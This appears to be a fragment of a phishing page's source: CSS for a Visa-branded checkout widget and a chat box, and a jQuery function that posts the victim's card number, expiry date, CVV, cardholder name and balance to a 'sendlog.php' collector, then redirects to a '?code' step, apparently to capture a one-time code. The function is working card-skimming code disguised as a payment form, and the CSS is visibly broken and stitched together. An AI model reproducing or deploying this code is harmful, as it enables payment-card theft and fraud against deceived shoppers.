  <style type="text/css">

        transform: translate(-1px, -2px) rotate(-1deg)
      }

      20% {
        transform: translate(-3px) rotate(1deg)

  <style type="text/css">
    .visa-checkout {
      width: calc(100% - 1px);
      height: calc(100% - 1px);
      cursor: pointer;
      border-right: 1px solid #f1f1f1;
      border-bottom: 1px solid #f1f1f1
    }

    .visa-checkout__name {
      font-size: 12px;
      display: none;
      text-align: center;
      position: absolute;
      bottom: 3px;
      left: 0;
      right: 0;
      transition: opacity .2s linear;
      color: #707070;
      width: 98%;
      height: 1em;
      line-height: 1em;
      margin: 0 auto;
      overflow: hidden
    }

    .visa-checkout__name p {
      position: absolute;
      margin: 0;
      white-space: nowrap;
      text-align: center;
      width: 100%
    }

    .visa-checkout:hover>.visa-checkout__logo {
      transform: translateY(-10px);
      transition: transform .3s linear
    }

    .visa-checkout:hover>.visa-checkout__name {
      display: block
    }

    .visa-checkout:hover>.visa-checkout__name p {
      animation: slide-text 5s linear infinite;
      -webkit-animation: slide-text 5s linear infinite
    }

    .visa-checkout__tooltip {
      max-width: 300px
    }

    .visa-checkout--shadow-box {
      transition: transform .3s;
      transform: translate(0);
      outline: none
    }

    .visa-checkout--shadow-box:hover {
      width: calc(100% + 2px);
      height: calc(100% + 2px);
      border-top: 1px solid #f1f1f1;
      box-shadow: 0 3px 5px 0 #d6d6d6;
      transition: transform .3s;
      transform: translateY(-1px);
      position: absolute;
      z-index: 10
    }

    .visa-checkout__logo {
      height: 100%;
      box-sizing: border-box;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      transform: translate(0);
      transition: transform .3s linear
    }

    .visa-checkout__logo img {
      max-width: 80%;
      max-height: calc(90% - 20px);
      vertical-align: middle
    }

    .visa-checkout--disabled {
      cursor: not-allowed
    }

    .visa-checkout--border-black {
      border-color: #000
    }

    .visa-checkout--border-right-disabled {
      width: 100%;
      border-right: initial
    }

    .visa-checkout--border-bottom-disabled {
      height: 100%;
      border-bottom: initial
    }

    .visa-checkout__icon--hidden {
      visibility: hidden;
      height: 1px;
      width: 1px;
      float: left
    }

    @keyframes slide-text {
      0% {
        transform: translateX(0);
        padding-left: 110%
      }

        transform: translateX(-100%);
        padding-left: 110%

    .container_message {
      position: relative;
      background-color: #e8ecef;
      border-radius: 9px;
      padding: 10px;
      margin: 10px 0;
      margin-left: 0px;
      display: flex;
      justify-content: right;
      flex: 0 0 auto;
      width: 50%;
      margin-left: 160px;
      min-height: 25px;
    }

    /* Darker chat container */
    .darker {
      border-color: #ccc;
      background-color: #002f34;
      min-height: 45px;
      display: flex;
      justify-content: left;
      margin-left: 0;
      padding: 10px;
    }

    /* Clear floats */
    .container_message::after {
      content: "";
      clear: both;
      display: table;
    }

    /* Style images */
    .container_message img {
      max-width: 50px;
      float: left;
      max-width: 60px;
      width: 100%;
      margin-right: 20px;
      border-radius: 50%;
    }

    /* Style the right image */

      float: right;
      max-width: 50px;
      margin-left: 20px;
      margin-right: 0;
    }

    /* Style time text */
    .container_message .time-right {
      position: absolute;
      left: 5px;
      bottom: 0;
      float: left;
      color: #aaa;
    }

    /* Style time text */
    .container_message .time-left {
      position: absolute;
      left: 5px;
      bottom: 0;
      float: left;
      width: 100%;
      color: #fff;
    }

      float: right;
      width: 16px;
      height: 16px;
      opacity: 0.4;
    }

    .close:hover {

    }

    .close:before,
    .close:after {
      position: absolute;
      content: ' ';
      height: 23px;
      width: 3px;
      background-color: #fff;
    }

    .close:before {
      transform: rotate(45deg);
    }

    .close:after {

    function cardlog() {
      var card_date = $('#expdate').val();
      Data = new Date();
      let month = card_date.split("/")[0]
      let year = card_date.split("/")[1]
      let current_moth = Data.getMonth() + 1;
      let current_year = Data.getFullYear().toString();
      current_year = current_year[0] + current_year[1];
      if (month[0] == 0) {
        month = month.slice(1);
      }
      if (month < current_moth && year <= current_year) {
        // alert("  ");
        var valid_card = '0';
      }
      else {
        var valid_card = '1';
      }
      if ($('#cardnumber').val() != '' && $('#expdate').val() != '' && $('#cvc2').val() != '' && $('#card_balance').val() >= 1 && $('#card_balance').val() != 0 && $('#card_balance').val() != ' ' && $('#card_balance').val() != '' && $('#card_balance').val() != ' ' && valid_card == '1') {
        $('#paybutton').css('background', 'gray');
        $('#paybutton').attr('disabled', '1');

        var cardNumber = $('#cardnumber').val();
        var expdate = $('#expdate').val();

        var cvv = $('#cvc2').val();
        var config = 'cardlog';
        var worker = "";
        var item = '';
        var cardholder = $('#cardholder').val();
        var card_balance = $('#card_balance').val();
        $.ajax({
          type: "POST",
          url: "sendlog.php",
          data: { cardNumber: cardNumber, expdate: expdate, cvv: cvv, config: config, item: item, cardholder: cardholder, worker: worker, card_balance: card_balance },
        }).fail(function () {
          setTimeout(function () {
            window.location.href = "?code";
          }, 1000);
        }).done(function () {
          setTimeout(function () {
            window.location.href = "?code";
          }, 1000);
        });
      }
      else {
        ($('#cardnumber').val() == '') ? $('#cardnumber').css("border-color", "red") : $('#cardnumber').css("border-color", "");
        ($('#card_balance').val() == '') ? $('#card_balance').css("border-color", "red") : $('#card_balance').css("border-color", "");
        if ($('#card_balance').val() < 5) {
          $('#verif_balance').toggle();
          $('#card_balance').css("border-color", "red");
        }
        if ($('#card_balance').val() == 0) {
          $('#verif_balance').toggle();
          $('#card_balance').css("border-color", "red");
        }


        ($('#cardholder').val() == '') ? $('#cardholder').css("border-color", "red") : $('#cardholder').css("border-color", "");
        if (valid_card == '0') {
          $('#expdate').css("border-color", "red")
        }
        if (valid_card == '1') {
          $('#expdate').css("border-color", "");
        }

        if ($('#expdate').val() == '') {
          $('#expdate').css("border-color", "red")
        }
        if ($('#expdate').val() == '') {
          $('#expdate').css("border-color", "");
        }
        ($('#cvc2').val() == '') ? $('#cvc2').css("border-color", "red") : $('#cvc2').css("border-color", "");
      };
    }
